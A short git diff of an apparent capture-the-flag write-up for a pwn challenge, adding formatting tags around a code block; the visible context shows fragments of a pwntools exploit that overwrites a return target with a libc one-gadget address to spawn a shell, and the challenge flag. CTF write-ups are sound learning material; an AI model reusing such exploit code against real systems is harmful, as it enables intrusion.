@@ -28,6 +28,7 @@ layout:
 
 ## Solution
 
+{% code overflow="wrap" %}
 ```py
 from pwn import *
 
@@ -102,5 +103,6 @@ io.sendlineafter('>', flat({offset: libc.address + 0x4f3d5}))
 # Got Shell?
 io.interactive()
 ```
+{% endcode %}
 
 Flag: `CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}`
